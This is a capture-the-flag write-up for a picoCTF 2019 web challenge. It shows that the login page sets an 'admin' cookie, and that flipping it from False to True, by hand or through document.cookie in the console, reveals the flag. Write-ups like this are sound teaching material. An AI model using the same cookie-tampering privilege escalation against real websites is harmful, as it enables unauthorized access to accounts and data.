## Problem Statement
---

### Lab 2: logon (100 pts)

**Problem:**

>The factory is hiding things from all of its users. Can you login as logon and find what they've been looking at? https://2019shell1.picoctf.com/problem/47307/ or http://2019shell1.picoctf.com:47307

**Hints:**

1. Hmm it doesn't seem to check anyone's password, except for {{name}}'s?

## Write-Up
---

We first notice that *any* username and password combination is allowed, however no flag is displayed.

Inspecting web traffic, notice that the server sends back 3 cookies (namely `admin`, `username` and `password`) when logging in:

```
< HTTP/1.1 302 FOUND
< Server: nginx
< Date: Mon, 07 Oct 2019 23:20:22 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 217
< Connection: keep-alive
< Location: https://2019shell1.picoctf.com/flag

* Replaced cookie password="a" for domain 2019shell1.picoctf.com, path /, expire 0

< Set-Cookie: password=a; Path=/
< Set-Cookie: username=test; Path=/
< Set-Cookie: admin=False; Path=/
```

Therefore, changing the cookie `admin` from `False` to `True` and reloading the webpage allows us to see the flag.

**Note:** You can change cookie values through the inspector (on Chrome its usually under Application -> Cookies), however that method is sometimes not optimal. Instead, you can open up the Inspector and under Console, type `document.cookie="keyofcookie=valueofcookie"` to change cookies.
